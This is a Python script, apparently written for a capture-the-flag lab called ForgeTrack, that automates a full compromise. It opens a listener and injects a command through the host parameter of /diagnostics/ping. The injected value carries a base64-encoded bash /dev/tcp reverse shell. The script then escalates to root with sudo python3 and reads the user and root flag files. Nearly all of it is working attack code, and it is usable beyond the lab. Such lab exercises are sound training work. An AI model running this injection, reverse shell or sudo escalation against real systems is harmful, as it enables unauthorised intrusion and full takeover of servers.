#!/usr/bin/env python3
"""Get a reverse shell from the ForgeTrack lab and read both OS flags.

The script listens locally, fires the /diagnostics/ping injection, then sends
the privesc commands over the resulting shell. Authorised lab use only.

Usage:
    python3 get-reverse-shell.py http://VM_IP --attacker 192.168.1.50
    python3 get-reverse-shell.py http://VM_IP --attacker 10.0.2.15 --port 4444

If --attacker is omitted the script guesses the address used for outbound
traffic (it does not actually send a packet).
"""

import argparse
import base64
import re
import socket
import sys
import time
import urllib.error
import urllib.parse
import urllib.request


def guess_attacker_ip() -> str:
    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        probe.connect(("8.8.8.8", 80))
        return probe.getsockname()[0]
    except OSError:
        return "127.0.0.1"
    finally:
        probe.close()


def drain(sock: socket.socket, seconds: float = 1.0) -> str:
    sock.settimeout(0.4)
    deadline = time.time() + seconds
    data = bytearray()
    while time.time() < deadline:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            continue
        except OSError:
            break
        if not chunk:
            break
        data.extend(chunk)
        deadline = time.time() + 0.5
    return data.decode("utf-8", errors="replace")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("target", nargs="?", default="http://127.0.0.1",
                        help="base URL of the lab, e.g. http://192.168.1.42")
    parser.add_argument("--attacker", default=None,
                        help="IP the target can reach (your VMware adapter IP)")
    parser.add_argument("--port", type=int, default=4444)
    parser.add_argument("--connect-timeout", type=int, default=60)
    args = parser.parse_args()

    base = args.target.rstrip("/")
    attacker = args.attacker or guess_attacker_ip()

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        listener.bind(("0.0.0.0", args.port))
    except OSError as error:
        print("ERROR: cannot bind port {}: {}".format(args.port, error), file=sys.stderr)
        return 1
    listener.listen(1)
    print("Listening on 0.0.0.0:{} (attacker IP: {})".format(args.port, attacker))

    shell_cmd = "bash -i >& /dev/tcp/{}/{} 0>&1".format(attacker, args.port)
    encoded = base64.b64encode(shell_cmd.encode()).decode()
    host = (
        "127.0.0.1; nohup bash -c 'echo {} | base64 -d | bash' "
        ">/dev/null 2>&1 &"
    ).format(encoded)
    url = base + "/diagnostics/ping?" + urllib.parse.urlencode({"host": host})

    print("Firing payload at " + base + "/diagnostics/ping ...")
    try:
        with urllib.request.urlopen(url, timeout=10) as response:
            response.read()
    except (urllib.error.URLError, TimeoutError) as error:
        print("WARNING: HTTP request returned an error: {}".format(error),
              file=sys.stderr)

    listener.settimeout(args.connect_timeout)
    try:
        sock, address = listener.accept()
    except socket.timeout:
        print("ERROR: no shell connected. Check the attacker IP, firewall and "
              "that port {} is reachable from the VM.".format(args.port),
              file=sys.stderr)
        return 1
    finally:
        listener.close()

    print("Shell received from {}".format(address[0]))
    transcript = [drain(sock, 1.0)]

    commands = [
        ("id", 1.0),
        ("cat /home/forge/user.txt", 1.0),
        ("sudo -n -l", 1.0),
        ('sudo -n /usr/bin/python3 -c \'import os; os.system("/bin/bash")\'', 1.5),
        ("id", 1.0),
        ("cat /root/root.txt", 1.0),
        ("exit", 0.5),
    ]
    for command, wait in commands:
        sock.sendall((command + "\n").encode())
        transcript.append("\n$ " + command + "\n")
        transcript.append(drain(sock, wait))

    sock.close()
    output = "".join(transcript)

    print("\n== Shell transcript ==")
    print(output)

    flags = sorted(set(re.findall(r"THM\{[^}]*\}", output)))
    print("\n== Flags ==")
    if flags:
        for flag in flags:
            print(flag)
    else:
        print("No THM flags found. Verify the flag files exist and re-run.")
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
